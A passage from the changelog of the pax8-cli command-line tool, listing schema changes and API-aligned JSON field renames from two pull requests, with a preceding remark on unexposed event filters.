  Per-topic `filters` are accepted by the spec but not yet exposed on the CLI surface — each topic ships with an empty filter array, which the server treats as "deliver every event for this topic". A structured filter-authoring UX is tracked separately.

### Minor Changes

- [#277](https://github.com/pax8labs/pax8-cli/pull/277) [`0b579bd`](https://github.com/pax8labs/pax8-cli/commit/0b579bd35c58db62bf038c9641b474eec3d9ce87) Thanks [@jidulberger](https://github.com/jidulberger)! - **Schema additions and a small dropped field.**
  - `Product.vendor` (duplicate of `vendorName`) removed — only `vendorName` remains, matching the public API. Demo data and consumers updated.
  - `Company.externalId` surfaced — partner-side identifier returned by the API. Available in `pax8 companies show` (table + `--json`).
  - `Subscription.currencyCode` surfaced — ISO-4217 currency code returned by the API. Available in `pax8 subscriptions list/show` `--json` output; appended to the price column in table view only when the value is non-`USD`.
  - Inline documentation block added on `SubscriptionSchema` clarifying the intentional ergonomic split between the canonical nested `commitment` (alias for the API's `commitmentTerm`) and the flattened top-level `commitmentTermEndDate`. No behavior change.

  Closes [#273](https://github.com/pax8labs/pax8-cli/issues/273).

- [#275](https://github.com/pax8labs/pax8-cli/pull/275) [`6f282fb`](https://github.com/pax8labs/pax8-cli/commit/6f282fb109fe91dffb1a7eeafa3a104d36b12e58) Thanks [@jidulberger](https://github.com/jidulberger)! - **Breaking (`--json` consumers): Field naming aligned with the public Pax8 API.**
  - `InvoiceItem.subtotal` → `subTotal`
  - `InvoiceItem.unitPrice` → `price`
  - `Company.modified` → `updatedDate`
  - `Quote.expirationDate` → `expiresOn`
  - `Quote.createdDate` → `createdOn`

  Acceptable while pre-1.0; the CLI now uses API field names directly so partners reading both surfaces don't have to translate. The `--expiration-date` CLI flag on `pax8 quotes create` and `pax8 quotes update` is unchanged — flag vocabulary and field vocabulary are intentionally separate concerns. (refs [#273](https://github.com/pax8labs/pax8-cli/issues/273))
